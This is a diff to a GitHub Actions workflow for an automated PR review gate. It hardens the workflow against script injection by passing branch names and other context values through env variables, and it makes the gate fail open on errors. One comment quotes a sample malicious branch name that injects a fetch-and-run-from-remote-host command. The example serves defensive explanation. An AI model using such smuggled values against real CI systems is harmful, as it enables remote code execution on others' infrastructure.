@@ -106,34 +106,67 @@ jobs:
         id: since
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # **Never interpolate these into the script.** A branch name is
+          # attacker-controlled on a fork pull request, and `${{ }}` substitutes
+          # before bash parses — so a branch called `x";curl evil|sh;"` executes.
+          # This repo is public and takes external contributions, so it is a
+          # live surface rather than a theoretical one. Through `env:` the value
+          # reaches bash as data and quoting holds.
+          HEAD_REF: ${{ github.head_ref }}
+          BASE_REF: ${{ github.base_ref }}
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          REPO: ${{ github.repository }}
         run: |
           caller=$(basename "${GITHUB_WORKFLOW_REF%%@*}")
           echo "Caller workflow: $caller"
 
-          prev=$(gh api "repos/${{ github.repository }}/actions/workflows/$caller/runs?branch=${{ github.head_ref }}&status=success&per_page=20" \
-            --jq '[.workflow_runs[] | select(.head_sha != "${{ github.event.pull_request.head.sha }}")] | .[0].head_sha // ""' 2>/dev/null || echo "")
+          prev=$(gh api "repos/$REPO/actions/workflows/$caller/runs?branch=$HEAD_REF&status=success&per_page=20" \
+            --jq --arg sha "$HEAD_SHA" \
+            '[.workflow_runs[] | select(.head_sha != $sha)] | .[0].head_sha // ""' 2>/dev/null || echo "")
 
           if [ -n "$prev" ] && git cat-file -e "$prev^{commit}" 2>/dev/null; then
             echo "base=$prev" >> "$GITHUB_OUTPUT"
             echo "Comparing against the last reviewed commit: $prev"
           else
-            echo "base=origin/${{ github.base_ref }}" >> "$GITHUB_OUTPUT"
+            echo "base=origin/$BASE_REF" >> "$GITHUB_OUTPUT"
             echo "No previous review found — comparing against the base branch."
           fi
 
-          # The last review's text, so the gate can tell whether this push
-          # touches something it named. A records-only push that answers a
-          # finding is worth re-reviewing; one that does not, is not.
-          gh api "repos/${{ github.repository }}/issues/${{ github.event.pull_request.number }}/comments" \
+          # The last review's *findings*, not the whole tracking comment.
+          #
+          # The comment opens with a todo checklist — `- [x] Read src/x.ts` —
+          # and often closes with a passing mention like "nothing contradicts
+          # .agent/decisions.md". Both name files without raising anything, and
+          # the gate cannot tell them from a finding, so a records-only push
+          # would be re-reviewed at ~$1.14 on the strength of a closing
+          # sentence. That is precisely the spend the gate exists to remove.
+          #
+          # Checklist lines are dropped because their shape is unambiguous.
+          # Passing mentions in prose are a known remaining looseness: the input
+          # is the wrong shape for a regex to separate, and tuning the matcher
+          # will not fix it. Recorded so the matcher is not blamed for it.
+          gh api "repos/$REPO/issues/$PR_NUMBER/comments" \
             --jq '[.[] | select(.user.login == "github-actions[bot]")] | .[-1].body // ""' \
-            > /tmp/prior-review.md 2>/dev/null || : > /tmp/prior-review.md
+            2>/dev/null | grep -v -E '^\s*-\s*\[[ x]\]' > /tmp/prior-review.md \
+            || : > /tmp/prior-review.md
 
       - name: Is this worth a review?
         id: needed
+        env:
+          BASE: ${{ steps.since.outputs.base }}
         run: |
-          echo "review=$(node .morpheus/dist/cli/index.js review needed \
-            --base ${{ steps.since.outputs.base }} \
-            --prior-review /tmp/prior-review.md)" >> "$GITHUB_OUTPUT"
+          # Not `review=$(node …)`. Command substitution swallows a non-zero
+          # exit into an empty string, which reads as "false" and skips — losing
+          # the fail-open that `needed()` deliberately provides for an
+          # unreadable diff. A crash here must review, not go quiet.
+          if ! out=$(node .morpheus/dist/cli/index.js review needed \
+            --base "$BASE" --prior-review /tmp/prior-review.md); then
+            echo "review=true" >> "$GITHUB_OUTPUT"
+            echo "::warning title=Review gate failed::could not decide — reviewing rather than skipping"
+            exit 0
+          fi
+          echo "review=$out" >> "$GITHUB_OUTPUT"
 
       - name: Report the review as skipped
         if: steps.needed.outputs.review != 'true'
